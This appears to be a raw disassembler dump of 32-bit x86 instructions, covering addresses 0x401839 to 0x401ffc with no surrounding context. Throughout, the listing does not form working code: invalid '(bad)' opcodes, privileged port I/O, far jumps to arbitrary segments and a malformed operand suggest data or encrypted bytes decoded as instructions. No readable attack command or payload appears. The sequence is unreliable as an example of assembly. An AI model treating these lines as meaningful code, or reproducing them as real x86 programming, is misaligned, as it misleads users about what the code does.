  401839:	xchg   ecx,eax
  40183a:	pop    esp
  40183b:	not    BYTE PTR [ebx]
  40183d:	and    BYTE PTR [ebx],cl
  40183f:	rcl    ah,cl
  401841:	fwait
  401842:	pop    esp
  401843:	stos   BYTE PTR es:[edi],al
  401844:	push   edi
  401845:	nop
  401846:	or     dl,BYTE PTR [esi-0x76f309d4]
  40184c:	aad    0x2b
  40184e:	pop    ebp
  40184f:	mov    ebx,0xbe542f4f
  401854:	fcmove st,st(3)
  401856:	inc    ebx
  401857:	int    0xed
  401859:	bound  ecx,QWORD PTR [ebp-0x5a]
  40185c:	adc    eax,0xb3e32ca3
  401861:	mov    DWORD PTR [ebx-0x76],ecx
  401864:	inc    ebp
  401865:	jle    0x401879
  401867:	lea    eax,[ebx+0x64]
  40186a:	add    eax,0x6e787b8
  40186f:	or     esi,esi
  401871:	adc    eax,0x849bc0d1
  401876:	out    0xe6,al
  401878:	(bad)  
  401879:	xchg   ecx,eax
  40187a:	ja     0x401823
  40187c:	loope  0x4018c6
  40187e:	sub    al,0xcf
  401880:	mov    esi,0xcdcb2a72
  401885:	jmp    0x35b4:0x799c43a4
  40188c:	pusha  
  40188d:	cmp    edx,DWORD PTR [ebp+0x3f]
  401890:	sbb    al,0xb2
  401892:	add    dl,BYTE PTR [edi+0x1c]
  401895:	or     eax,DWORD PTR [eax+0x31]
  401898:	mov    edx,0x9a2ba999
  40189d:	xchg   ebx,eax
  40189e:	xor    eax,edi
  4018a0:	inc    eax
  4018a1:	xor    al,BYTE PTR [edi]
  4018a3:	in     eax,dx
  4018a4:	lock pushf 
  4018a6:	pop    es
  4018a7:	adc    al,0xf3
  4018a9:	out    0xa3,eax
  4018ab:	xlat   BYTE PTR ds:[ebx]
  4018ac:	lods   al,BYTE PTR ds:[esi]
  4018ad:	and    DWORD PTR [edi],0x22
  4018b0:	push   ebx
  4018b1:	push   ds
  4018b2:	icebp  
  4018b3:	fcmovne st,st(3)
  4018b5:	jmp    0x3784dc12
  4018ba:	pop    ds
  4018bb:	hlt    
  4018bc:	jl     0x401930
  4018be:	xchg   esp,eax
  4018bf:	ss push eax
  4018c1:	fbld   TBYTE PTR [ecx-0x51]
  4018c4:	or     al,0xff
  4018c6:	add    BYTE PTR [ebp+0x6f],0x2e
  4018ca:	out    dx,eax
  4018cb:	(bad)  
  4018cc:	pop    ecx
  4018cd:	das    
  4018ce:	mov    edi,0x4c0b0d1e
  4018d3:	adc    eax,0xb2b0e9a
  4018d8:	adc    BYTE PTR [eax],dh
  4018da:	shr    BYTE PTR [ebx+0x731b9196],1
  4018e0:	sub    BYTE PTR [ecx-0x13],bl
  4018e3:	jbe    0x401921
  4018e5:	inc    edx
  4018e6:	push   esp
  4018e7:	mov    bl,0x2b
  4018e9:	mov    bh,0x2e
  4018eb:	int3   
  4018ec:	(bad)  
  4018ed:	das    
  4018ee:	jnp    0x4018bb
  4018f0:	enter  0xa6c4,0x65
  4018f4:	add    al,0xa1
  4018f6:	push   edx
  4018f7:	ins    BYTE PTR es:[edi],dx
  4018f8:	aas    
  4018f9:	in     al,dx
  4018fa:	add    dh,dh
  4018fc:	aaa    
  4018fd:	loope  0x401976
  4018ff:	(bad)  
  401901:	call   0x91a3:0x8ba1f5a7
  401908:	out    0xe3,al
  40190a:	add    eax,0xb06476ca
  40190f:	push   esp
  401910:	inc    ebx
  401911:	daa    
  401912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401913:	xchg   esp,eax
  401914:	xchg   ebp,eax
  401915:	xor    al,0xf6
  401917:	arpl   cx,si
  401919:	rol    ah,1
  40191b:	add    DWORD PTR [ecx-0x49ed0bda],eax
  401921:	mov    bh,0xb1
  401923:	xor    al,0xb3
  401925:	sbb    esi,DWORD PTR [edx-0x99a9bf7]
  40192b:	retf   
  40192c:	pop    edx
  40192d:	xor    esi,DWORD PTR [eax-0x6a19884f]
  401933:	sbb    ebx,DWORD PTR [ebp-0x4a]
  401936:	jnp    0x40195c
  401938:	xor    DWORD PTR [edi-0x38596be4],ebx
  40193e:	jno    0x40191a
  401940:	xor    al,0x77
  401942:	or     eax,0x5ffdbe16
  401947:	test   al,0x2b
  401949:	xchg   esi,eax
  40194a:	ja     0x401920
  40194c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40194d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40194e:	mov    BYTE PTR [esi-0x5fbc9e62],ch
  401954:	cmp    al,0x9f
  401956:	xor    eax,DWORD PTR [ecx]
  401958:	in     eax,0x16
  40195a:	adc    esi,esi
  40195c:	or     al,0xbe
  40195e:	jne    0x4019dd
  401960:	mov    cs,ecx
  401962:	int3   
  401963:	pop    ds
  401964:	out    0x65,al
  401966:	sbb    ch,dh
  401968:	call   0x211b:0x667a63b8
  40196f:	jecxz  0x40196b
  401971:	and    eax,esp
  401973:	or     ebx,ecx
  401975:	mov    DWORD PTR [ebp+0x75],ecx
  401978:	push   edx
  401979:	mov    eax,ds:0xd0e7d1a6
  40197e:	sub    BYTE PTR [edi],cl
  401980:	jl     0x40199e
  401982:	stc    
  401983:	sbb    BYTE PTR es:[ebx+eiz*1-0x23],cl
  401988:	ret    
  401989:	push   DWORD PTR [ebx]
  40198b:	and    eax,0xcfb2f9ad
  401990:	mov    ebp,DWORD PTR [eax]
  401992:	lods   al,BYTE PTR ds:[esi]
  401993:	repz add DWORD PTR [eax-0x7c],0x272f8d7d
  40199b:	xor    al,0xb4
  40199d:	int    0x58
  40199f:	pushf  
  4019a0:	(bad)  
  4019a1:	loope  0x4019ce
  4019a3:	loop   0x40195e
  4019a5:	fisubr DWORD PTR ds:[ecx]
  4019a8:	fimul  WORD PTR [esi-0x5]
  4019ab:	mov    cl,bh
  4019ad:	in     al,0x9
  4019af:	jno    0x4019c6
  4019b1:	loopne 0x4019f5
  4019b3:	or     al,0x6d
  4019b5:	loope  0x4019ab
  4019b7:	mov    dh,0x78
  4019b9:	pop    eax
  4019ba:	xor    eax,0x7f2ad477
  4019bf:	add    edi,esi
  4019c1:	aas    
  4019c2:	out    dx,eax
  4019c3:	dec    eax
  4019c4:	cmp    cl,0x41
  4019c7:	ret    0x3712
  4019ca:	jle    0x4019fd
  4019cc:	cdq    
  4019cd:	out    dx,al
  4019ce:	pusha  
  4019cf:	test   BYTE PTR [ebx-0x9eee6e1],dl
  4019d5:	push   0xec346220
  4019da:	(bad)  
  4019db:	stos   DWORD PTR es:[edi],eax
  4019dc:	mov    ah,0x17
  4019de:	js     0x401a55
  4019e0:	retf   0xe311
  4019e3:	dec    edx
  4019e4:	mov    ecx,0xcb44a081
  4019e9:	pop    ss
  4019ea:	test   DWORD PTR [eax-0x43],ecx
  4019ed:	bound  ebx,QWORD PTR [edx]
  4019ef:	retf   0x1215
  4019f2:	add    ecx,0x50
  4019f5:	push   ecx
  4019f6:	sub    DWORD PTR [ebp-0x4],0xffffffe6
  4019fa:	dec    ebx
  4019fb:	mov    dh,BYTE PTR [ecx+eiz*4+0xd]
  4019ff:	sbb    eax,0x40008c69
  401a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a05:	stos   DWORD PTR es:[edi],eax
  401a06:	int3   
  401a07:	push   0x3ff90baa
  401a0c:	jbe    0x401a32
  401a0e:	fsubrp st(7),st
  401a10:	jno    0x401a54
  401a12:	fist   DWORD PTR [eax]
  401a14:	addr16 fcmovnb st,st(0)
  401a17:	dec    edx
  401a18:	cld    
  401a19:	ret    0x4d79
  401a1c:	imul   edx,ebp,0x4093f4e8
  401a22:	jae    0x401a96
  401a24:	jg     0x401a86
  401a26:	pop    es
  401a27:	mov    ecx,0x2e564339
  401a2c:	mov    WORD PTR [esi-0x40a2c25c],es
  401a32:	pushf  
  401a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a34:	mov    al,ds:0xca6c2a80
  401a39:	mov    cl,cl
  401a3b:	(bad)  
  401a3c:	stos   BYTE PTR es:[edi],al
  401a3d:	ins    BYTE PTR es:[edi],dx
  401a3e:	mov    ch,BYTE PTR [edi+0x28155c60]
  401a44:	mov    dh,0x56
  401a46:	push   edi
  401a47:	clc    
  401a48:	or     al,0x31
  401a4a:	dec    ebp
  401a4b:	xorps  xmm2,XMMWORD PTR [ebx]
  401a4e:	or     ah,BYTE PTR ds:0xb9eeb28d
  401a54:	stos   DWORD PTR es:[edi],eax
  401a55:	jb     0x401a6f
  401a57:	mov    cl,BYTE PTR [edx-0x34]
  401a5a:	and    ecx,DWORD PTR [eax+edx*2]
  401a5d:	int3   
  401a5e:	add    eax,DWORD PTR [edi+0x1f9196bc]
  401a64:	shl    DWORD PTR [ecx],cl
  401a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a67:	adc    ebx,DWORD PTR [esi+0x33]
  401a6a:	push   esp
  401a6b:	jle    0x401a8c
  401a6d:	or     esi,esp
  401a6f:	xadd   DWORD PTR [esi+eax*2+0x10],edi
  401a74:	mov    ds:0x9c53a1b1,al
  401a79:	int3   
  401a7a:	fidiv  WORD PTR [edx+0x12f5ff53]
  401a80:	sbb    eax,0x1f34daf8
  401a85:	xor    ebx,eax
  401a87:	push   0xa566920a
  401a8c:	(bad)  
  401a8d:	adc    DWORD PTR [edi],ebp
  401a8f:	sub    DWORD PTR [ebp-0xa0cc5b9],edx
  401a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a96:	sbb    eax,eax
  401a98:	aam    0xdf
  401a9a:	pop    esi
  401a9b:	jl     0x401a80
  401a9d:	je     0x401ad7
  401a9f:	mov    edx,DWORD PTR [edx-0x61]
  401aa2:	aam    0xbf
  401aa4:	mov    ah,0xc
  401aa6:	aad    0xc4
  401aa8:	jns    0x401a57
  401aaa:	mov    WORD PTR [ebp-0x6471dccb],es
  401ab0:	or     bl,BYTE PTR [ebp+0x2]
  401ab3:	jmp    0x9297:0x3d0c5ff6
  401aba:	stos   BYTE PTR es:[edi],al
  401abb:	cmp    eax,edx
  401abd:	retf   
  401abe:	mov    edi,0x213d289f
  401ac3:	xor    ebx,ecx
  401ac5:	popa   
  401ac6:	cli    
  401ac7:	inc    ebx
  401ac8:	jns    0x401ac3
  401aca:	pop    edx
  401acb:	or     cl,BYTE PTR [esi]
  401acd:	dec    ebp
  401ace:	jg     0x401a68
  401ad0:	xor    edx,esi
  401ad2:	jnp    0x401b41
  401ad4:	sub    eax,0x2e71978b
  401ad9:	push   edx
  401ada:	rcl    BYTE PTR [eax-0x79],1
  401add:	(bad)  
  401ade:	xor    ah,BYTE PTR [ebp+ebx*1+0x1dc1b4cf]
  401ae5:	or     eax,0xa2de61e7
  401aea:	or     eax,0xeff81e65
  401aef:	jnp    0x401b0e
  401af1:	call   edx
  401af3:	clc    
  401af4:	push   ds
  401af5:	mov    ch,0x8f
  401af7:	pop    ebx
  401af8:	mov    eax,0xd52cf8b1
  401afd:	add    eax,0x93a2e68e
  401b02:	mov    ebp,0xd53e130a
  401b07:	popf   
  401b08:	sti    
  401b09:	xchg   ebp,eax
  401b0a:	add    ebx,eax
  401b0c:	(bad)  
  401b0d:	pop    ebx
  401b0e:	jno    0x401b5e
  401b10:	ins    BYTE PTR es:[edi],dx
  401b11:	stos   BYTE PTR es:[edi],al
  401b12:	test   ebx,ebp
  401b14:	data16 or ch,ah
  401b17:	sbb    al,0x54
  401b19:	or     DWORD PTR [edi],edx
  401b1b:	dec    edx
  401b1c:	js     0x401b1e
  401b1e:	jg     0x401b8d
  401b20:	ret    
  401b21:	(bad)  
  401b22:	popf   
  401b23:	daa    
  401b24:	mov    ah,0xf8
  401b26:	mov    BYTE PTR ds:0x3463074d,al
  401b2c:	inc    esi
  401b2d:	aad    0xda
  401b2f:	pop    ebp
  401b30:	inc    cx
  401b32:	sub    ecx,0x11
  401b35:	je     0x401b12
  401b37:	sub    edx,ecx
  401b39:	sub    eax,0x75841861
  401b3e:	mov    ah,0x6
  401b40:	jns    0x401adc
  401b42:	jb     0x401b42
  401b44:	sbb    eax,DWORD PTR [ebp+0x37]
  401b47:	clc    
  401b48:	push   ecx
  401b49:	cmp    eax,0x571c1e0
  401b4e:	(bad)  
  401b4f:	mov    ebx,0xa31ddb4b
  401b54:	retf   0xb148
  401b57:	xchg   ecx,eax
  401b58:	loope  0x401b70
  401b5a:	sub    edi,DWORD PTR [esi+0x3cd554df]
  401b60:	mov    ebx,0x35ef0882
  401b65:	pusha  
  401b66:	pop    esi
  401b67:	lahf   
  401b68:	hlt    
  401b69:	daa    
  401b6a:	or     eax,0xf2fc433b
  401b6f:	push   edi
  401b70:	stc    
  401b71:	mov    edi,0x40ef4910
  401b76:	jnp    0x401bab
  401b78:	add    eax,0xe173a752
  401b7d:	outs   dx,BYTE PTR ss:[esi]
  401b7f:	ja     0x401bc5
  401b81:	add    al,0x36
  401b83:	cmp    al,0x0
  401b85:	mov    ch,0x7e
  401b87:	(bad)  
  401b88:	out    dx,eax
  401b89:	dec    edi
  401b8a:	pop    ds
  401b8b:	mov    DWORD PTR [edi],esp
  401b8d:	retf   0x201f
  401b90:	jmp    0x401b23
  401b92:	mov    ebx,0xa2a747e9
  401b97:	out    0x56,al
  401b99:	jecxz  0x401ba7
  401b9b:	and    al,0xe1
  401b9d:	shl    BYTE PTR [ebx],cl
  401b9f:	das    
  401ba0:	jle    0x401bfb
  401ba2:	jmp    0x11c1:0xecf48048
  401ba9:	clc    
  401baa:	loopne 0x401c12
  401bac:	test   ebx,edx
  401bae:	sar    DWORD PTR [edx-0x7],1
  401bb1:	addr16 xchg al,al
  401bb4:	(bad)  
  401bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bb6:	pop    esi
  401bb7:	fistp  WORD PTR [edx]
  401bb9:	sbb    al,BYTE PTR [edi+ebp*8-0x69eed324]
  401bc0:	xlat   BYTE PTR ds:[ebx]
  401bc1:	mov    bl,BYTE PTR [eax+0x4268e118]
  401bc7:	test   eax,0x837c8ad7
  401bcc:	call   0xc8c4:0xf5dfec18
  401bd3:	push   ds
  401bd4:	mov    ebp,0x871d75c0
  401bd9:	loopne 0x401bda
  401bdb:	lods   al,BYTE PTR ds:[esi]
  401bdc:	adc    al,0xb9
  401bde:	cld    
  401bdf:	push   es
  401be0:	dec    edi
  401be1:	jne    0x401c1e
  401be3:	shr    DWORD PTR [ebp-0x459230de],1
  401be9:	jmp    0x401c28
  401beb:	ss jl  0x401c29
  401bee:	or     al,0x26
  401bf0:	mov    edi,DWORD PTR [ebp+0x4dd4e338]
  401bf6:	out    dx,eax
  401bf7:	xor    eax,0x22f53fe9
  401bfc:	ins    DWORD PTR es:[edi],dx
  401bfd:	mov    ds,WORD PTR [eax+0x77]
  401c00:	mov    esi,DWORD PTR [esp+0x14]
  401c04:	jae    0x401be8
  401c06:	fwait
  401c07:	jmp    0x661f:0x76bb8624
  401c0e:	mov    ebp,0x227a3eb3
  401c13:	or     al,0x36
  401c15:	aaa    
  401c16:	jns    0x401bac
  401c18:	pop    ebx
  401c19:	jb     0x401c67
  401c1b:	sbb    eax,0xa4e3cf09
  401c20:	dec    eax
  401c21:	call   0xe1876082
  401c26:	int    0x3c
  401c28:	out    0xba,eax
  401c2a:	sbb    DWORD PTR [ecx+0x7e],ebx
  401c2d:	push   ecx
  401c2e:	aam    0xe9
  401c30:	jno    0x401c3e
  401c32:	repnz bound eax,QWORD PTR cs:[edi-0x6ffa1829]
  401c3a:	daa    
  401c3b:	and    BYTE PTR [ecx-0xc],dl
  401c3e:	push   es
  401c3f:	xor    ch,ch
  401c41:	xor    ch,al
  401c43:	iret   
  401c44:	adc    DWORD PTR [eax-0x8],0xffffff9f
  401c48:	pop    ecx
  401c49:	out    0xe7,al
  401c4b:	push   cs
  401c4c:	inc    edx
  401c4d:	jb     0x401bd0
  401c4f:	mov    ?,WORD PTR [edi+0x9e6bbc8]
  401c55:	adc    BYTE PTR [ebx],bh
  401c57:	ins    BYTE PTR es:[edi],dx
  401c58:	mov    esi,0x6643627e
  401c5d:	outs   dx,BYTE PTR ds:[esi]
  401c5e:	push   ebp
  401c5f:	aam    0x7f
  401c61:	mov    ah,0x7c
  401c63:	aaa    
  401c64:	push   edi
  401c65:	ins    DWORD PTR es:[edi],dx
  401c66:	inc    esi
  401c67:	ss ret 0xeafd
  401c6b:	pop    esi
  401c6c:	popa   
  401c6d:	mov    eax,ds:0x9bfd101d
  401c72:	mov    eax,ecx
  401c74:	dec    edi
  401c75:	jg     0x401cf5
  401c77:	lods   al,BYTE PTR ds:[esi]
  401c78:	fldenv [ebp+ebx*8+0x3e]
  401c7c:	jns    0x401cdc
  401c7e:	sub    DWORD PTR [ebp+eax*4-0x3da320ce],ecx
  401c85:	xchg   esp,eax
  401c86:	jp     0x401c0e
  401c88:	out    0xec,al
  401c8a:	sub    DWORD PTR [ebx-0x582c0193],ebp
  401c90:	outs   dx,BYTE PTR ds:[esi]
  401c91:	les    esp,FWORD PTR [ebx-0x66]
  401c94:	xor    eax,0x313d2089
  401c99:	mov    esp,0xf3f45434
  401c9e:	scas   eax,DWORD PTR es:[edi]
  401c9f:	gs inc eax
  401ca1:	rcr    BYTE PTR [ebx],cl
  401ca3:	(bad)  
  401ca4:	int    0x92
  401ca6:	mov    bl,0xdf
  401ca8:	in     eax,dx
  401ca9:	pop    ebp
  401caa:	ja     0x401ca1
  401cac:	or     dl,dh
  401cae:	adc    al,0x71
  401cb0:	mov    dh,ah
  401cb2:	enter  0x92ad,0xf4
  401cb6:	adc    cl,ch
  401cb8:	aad    0x76
  401cba:	dec    esi
  401cbb:	les    ebp,FWORD PTR [ebx-0x16e97030]
  401cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cc2:	cmp    eax,0xabd874e1
  401cc7:	or     bl,ah
  401cc9:	xlat   BYTE PTR ds:[ebx]
  401cca:	mov    al,ds:0x8dd7d814
  401ccf:	jg     0x401c99
  401cd1:	mov    al,ds:0xe1d7defc
  401cd6:	(bad)  
  401cd7:	call   0x907a:0x7462d697
  401cde:	cwde   
  401cdf:	(bad)  
  401ce0:	int    0xd1
  401ce2:	mov    edx,0x3f7cb241
  401ce7:	pop    ecx
  401ce8:	fsub   DWORD PTR [edi+ecx*4+0x3a]
  401cec:	iret   
  401ced:	fs push ebx
  401cef:	cld    
  401cf0:	out    dx,eax
  401cf1:	push   esi
  401cf2:	jg     0x401d50
  401cf4:	mov    cl,0x64
  401cf6:	out    0xf0,al
  401cf8:	addr16 jmp 0x936f:0xaccb4eee
  401d00:	mov    ch,0x5d
  401d02:	jle    0x401d7a
  401d04:	jmp    0x401cb7
  401d06:	shr    BYTE PTR ds:0x54cb8dc1,0x6c
  401d0d:	fld    TBYTE PTR [ebp+0xa]
  401d10:	out    0xf8,eax
  401d12:	cmp    edx,DWORD PTR [edi-0x39]
  401d15:	and    dh,BYTE PTR ds:0x87dc3819
  401d1b:	pop    esi
  401d1c:	inc    esi
  401d1d:	cmp    ebx,DWORD PTR [esi]
  401d1f:	mov    DWORD PTR ds:0xd64974c6,esp
  401d25:	push   edx
  401d26:	cld    
  401d27:	add    BYTE PTR [ebx-0x48],cl
  401d2a:	sub    edx,DWORD PTR [eax]
  401d2c:	jb     0x401d7b
  401d2e:	fsub   DWORD PTR [ebx-0x7dc281d]
  401d34:	mov    bl,BYTE PTR [ecx-0x40]
  401d37:	fwait
  401d38:	test   al,0xd0
  401d3a:	inc    esi
  401d3b:	or     BYTE PTR [edi],0x17
  401d3e:	jae    0x401dac
  401d40:	add    dl,BYTE PTR [esi-0x2f]
  401d43:	mov    edi,0x342abb4c
  401d48:	sbb    al,0x66
  401d4a:	imul   ebp,DWORD PTR [esi],0x35a35ea7
  401d50:	mov    eax,0x3934181
  401d55:	sub    eax,0x5b3420c7
  401d5a:	mov    ah,0x31
  401d5c:	mov    bh,0x62
  401d5e:	fwait
  401d5f:	jl     0x401de0
  401d61:	add    eax,0xdfe4a272
  401d66:	xor    edx,esi
  401d68:	loop   0x401d79
  401d6a:	cdq    
  401d6b:	push   cs
  401d6c:	pop    edi
  401d6d:	fbstp  TBYTE PTR [ecx+0x67]
  401d70:	add    ebx,esp
  401d72:	xor    BYTE PTR [edx-0x2505bc91],bh
  401d78:	add    al,0x90
  401d7a:	les    esp,FWORD PTR [ecx+0x56290102]
  401d80:	(bad)  
  401d81:	push   ebp
  401d82:	inc    ebx
  401d83:	fisttp QWORD PTR [ebp-0x2c]
  401d86:	dec    ebx
  401d87:	call   0xb270:0xe0e56682
  401d8e:	jns    0x401d8a
  401d90:	ja     0x401dcf
  401d92:	lds    ecx,FWORD PTR [ecx+0x5c]
  401d95:	aaa    
  401d96:	ja     0x401d61
  401d98:	out    0xc5,al
  401d9a:	and    esi,DWORD PTR [esi-0x72]
  401d9d:	xchg   BYTE PTR [ecx-0x59e42b1],bl
  401da3:	fisttp DWORD PTR [ecx+0xa]
  401da6:	adc    esi,DWORD PTR ds:0xdfd1290b
  401dac:	adc    al,0xcc
  401dae:	out    dx,eax
  401daf:	ins    DWORD PTR es:[edi],dx
  401db0:	clc    
  401db1:	add    eax,0x9c457f7f
  401db6:	pushf  
  401db7:	jae    0x401d40
  401db9:	ins    BYTE PTR es:[edi],dx
  401dba:	scas   eax,DWORD PTR es:[edi]
  401dbb:	mov    ecx,0x8d2a6326
  401dc0:	xchg   edx,eax
  401dc1:	ffree  st(5)
  401dc3:	inc    ebx
  401dc4:	pop    es
  401dc5:	jg     0x401d9f
  401dc7:	push   ss
  401dc8:	or     BYTE PTR [esi-0x7e5c0120],bh
  401dce:	pop    edx
  401dcf:	retf   0xfb2c
  401dd2:	and    eax,0x7fb76f24
  401dd7:	(bad)  
  401dd8:	sub    eax,0xd30b487a
  401ddd:	ss cdq 
  401ddf:	je     0x401dcb
  401de1:	mov    edi,DWORD PTR ds:0x5e384297
  401de7:	pop    eax
  401de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401de9:	xor    eax,0xea34b9b6
  401dee:	icebp  
  401def:	pushf  
  401df0:	sub    edx,ebp
  401df2:	push   ds
  401df3:	mov    ds:0xfdac6978,al
  401df8:	mov    eax,DWORD PTR [ebx+0x14791263]
  401dfe:	mov    ebp,0xbe328b38
  401e03:	neg    esp
  401e05:	sbb    al,0xed
  401e07:	cs dec ecx
  401e09:	out    dx,eax
  401e0a:	sub    eax,0x86412daf
  401e0f:	sub    DWORD PTR [ebx+0x60],0x82aa4165
  401e16:	cmp    eax,0xb0b61e00
  401e1b:	pop    ds
  401e1c:	inc    esi
  401e1d:	test   eax,0x836f9394
  401e22:	ret    0xe196
  401e25:	aaa    
  401e26:	pop    ebx
  401e27:	enter  0x64a7,0x4f
  401e2b:	add    BYTE PTR [ecx-0x31eec738],bh
  401e31:	mov    WORD PTR [ebx+0x7f2832b7],ds
  401e37:	cld    
  401e38:	xchg   ebx,eax
  401e39:	fs mov cl,0x0
  401e3c:	ss mov ecx,0xc681f54c
  401e42:	add    eax,0x7a41c7b1
  401e47:	adc    esi,DWORD PTR [edx]
  401e49:	sub    dh,BYTE PTR [eax+0x6cb11bea]
  401e4f:	daa    
  401e50:	ror    ecx,cl
  401e52:	mov    ax,0xfb3b
  401e56:	sbb    ebx,ebx
  401e58:	stos   BYTE PTR es:[edi],al
  401e59:	pop    eax
  401e5a:	lods   al,BYTE PTR ds:[esi]
  401e5b:	ret    0x873b
  401e5e:	jecxz  0x401e64
  401e60:	jp     0x401e3b
  401e62:	jg     0x401e28
  401e64:	call   0xd105:0x76cf2614
  401e6b:	mov    ah,0x4d
  401e6d:	mov    ah,0xd5
  401e6f:	or     BYTE PTR [ecx],ah
  401e71:	push   ss
  401e72:	jmp    0x9452:0x4a3a6ab7
  401e79:	out    dx,eax
  401e7a:	mov    bh,0x52
  401e7c:	adc    al,0xdb
  401e7e:	icebp  
  401e7f:	out    0xcf,al
  401e81:	sub    ch,BYTE PTR [ebx-0x67389716]
  401e87:	cli    
  401e88:	mov    fs,WORD PTR [edi-0x1c48fe61]
  401e8e:	xchg   dl,al
  401e90:	adc    DWORD PTR [edx-0x5f],esp
  401e93:	repnz test DWORD PTR [ecx],edx
  401e96:	dec    edi
  401e97:	inc    esp
  401e98:	nop
  401e99:	xchg   ebx,eax
  401e9a:	test   BYTE PTR [ecx],dh
  401e9c:	mov    al,BYTE PTR [edi+0x4d01c62c]
  401ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ea3:	test   BYTE PTR [edi],bh
  401ea5:	dec    ebp
  401ea6:	loope  0x401e54
  401ea8:	cs xchg ecx,eax
  401eaa:	call   0xe7b576d8
  401eaf:	test   BYTE PTR [esi+ebp*1+0xe],bl
  401eb3:	je     0x401f05
  401eb5:	mov    esp,0xc107f0ee
  401eba:	dec    ebp
  401ebb:	push   0xffffffae
  401ebd:	sbb    cl,bl
  401ebf:	pop    es
  401ec0:	inc    edi
  401ec1:	pop    DWORD PTR [edx+0x4236e8ac]
  401ec7:	sub    ecx,DWORD PTR [esp+ecx*8-0x80]
  401ecb:	dec    edi
  401ecc:	xchg   esi,eax
  401ecd:	push   edx
  401ece:	inc    esi
  401ecf:	sbb    eax,0xa7a556b6
  401ed4:	out    dx,eax
  401ed5:	sub    DWORD PTR [edx-0x27],edx
  401ed8:	jecxz  0x401ed4
  401eda:	mov    ecx,0x85458324
  401edf:	aas    
  401ee0:	jl     0x401f22
  401ee2:	sub    ebp,ebp
  401ee4:	sti    
  401ee5:	(bad)  
  401ee7:	xchg   edx,eax
  401ee8:	mov    ds:0xaefbf934,eax
  401eed:	jle    0x401eb0
  401eef:	sbb    eax,0x10eba982
  401ef4:	shl    esi,1
  401ef6:	daa    
  401ef7:	jle    0x401efc
  401ef9:	jp     0x401eb3
  401efb:	adc    al,0x6e
  401efd:	lods   eax,DWORD PTR ds:[esi]
  401efe:	lahf   
  401eff:	xchg   edi,eax
  401f00:	mov    esp,0xf1058fe5
  401f05:	loopne 0x401e90
  401f07:	or     dh,0x3a
  401f0a:	retf   
  401f0b:	bound  edx,QWORD PTR [edx]
  401f0d:	mov    al,ds:0x9449416d
  401f12:	stc    
  401f13:	ds (bad) 
  401f15:	pusha  
  401f16:	mov    edx,0x7a250c91
  401f1b:	cmc    
  401f1c:	adc    al,0xc2
  401f1e:	sbb    BYTE PTR [esi-0x68],bh
  401f21:	sar    esi,1
  401f23:	adc    eax,DWORD PTR [edx-0x2e]
  401f26:	xchg   bx,ax
  401f28:	dec    edx
  401f29:	(bad)  
  401f2a:	outs   dx,DWORD PTR ds:[esi]
  401f2b:	sti    
  401f2c:	pushf  
  401f2d:	or     DWORD PTR [ebx+0x32d3dc80],0xfffffff9
  401f34:	stc    
  401f35:	or     edi,0x7a
  401f38:	mov    ebx,0x4b430666
  401f3d:	push   ds
  401f3e:	add    al,0x15
  401f40:	pop    esp
  401f41:	push   ebp
  401f42:	inc    ebp
  401f43:	or     BYTE PTR [ebp+0x39aaa1ac],dl
  401f49:	imul   eax,DWORD PTR [eax+ecx*1-0x47],0x56442408
  401f51:	push   0x19
  401f53:	sub    bl,BYTE PTR [edi]
  401f55:	dec    ecx
  401f56:	push   edx
  401f57:	in     al,0x7d
  401f59:	jp     0x401fb5
  401f5b:	es xchg esi,eax
  401f5d:	inc    ebp
  401f5e:	into   
  401f5f:	in     eax,dx
  401f60:	enter  0xf13e,0x82
  401f64:	cmp    dl,BYTE PTR [eax]
  401f66:	int    0xae
  401f68:	pop    eax
  401f69:	loop   0x401fd5
  401f6b:	pop    ds
  401f6c:	cwde   
  401f6d:	xor    edi,esi
  401f6f:	mov    bl,0x2b
  401f71:	mov    ebp,0x31b2199e
  401f76:	(bad)  
  401f77:	cmp    ch,BYTE PTR [ebx+0x28]
  401f7a:	not    DWORD PTR [ecx-0x676f1070]
  401f80:	xchg   edx,eax
  401f81:	mov    al,ds:0x152a56d1
  401f86:	stc    
  401f87:	add    ah,0x19
  401f8a:	lock xchg ebp,eax
  401f8c:	retf   
  401f8d:	call   0x7762:0x42b2a9b2
  401f94:	pop    ds
  401f95:	jns    0x401f18
  401f97:	outs   dx,DWORD PTR ds:[esi]
  401f98:	xor    eax,0x7a6e4911
  401f9d:	dec    edx
  401f9e:	dec    esi
  401f9f:	jnp    0x401f9c
  401fa1:	or     BYTE PTR [ecx],al
  401fa3:	jle    0x401f91
  401fa5:	test   eax,0xd366a559
  401faa:	mov    dl,0x8b
  401fac:	repnz xor al,0xb0
  401faf:	dec    esi
  401fb0:	ret    0xdfc1
  401fb3:	repnz cmp edx,DWORD PTR [ecx+0x8]
  401fb7:	aad    0x9d
  401fb9:	jmp    0x5d1cbd80
  401fbe:	sub    DWORD PTR [edx+0x4eff6c2],esi
  401fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fc5:	dec    ecx
  401fc6:	(bad)  
  401fc7:	scas   al,BYTE PTR es:[edi]
  401fc8:	mov    bh,0x84
  401fca:	dec    esi
  401fcb:	xchg   BYTE PTR [edi],dl
  401fcd:	jp     0x401f8a
  401fcf:	push   cs
  401fd0:	mov    ch,0x9d
  401fd2:	inc    esi
  401fd3:	jne    0x401f76
  401fd5:	mov    bh,0x14
  401fd7:	popa   
  401fd8:	(bad)  
  401fd9:	jbe    0x40200d
  401fdb:	out    0x67,eax
  401fdd:	pop    eax
  401fde:	add    esi,0xffffffed
  401fe1:	pusha  
  401fe2:	jmp    0x401fbf
  401fe4:	les    ebp,FWORD PTR cs:[ebp-0x44]
  401fe8:	shl    BYTE PTR [edx-0x5a],0xea
  401fec:	push   edx
  401fed:	add    eax,0xacd12ce8
  401ff2:	mov    edi,0xc2a74de9
  401ff7:	sti    
  401ff8:	ret    0x4850
  401ffb:	pushf  
  401ffc:	js     0x401f99
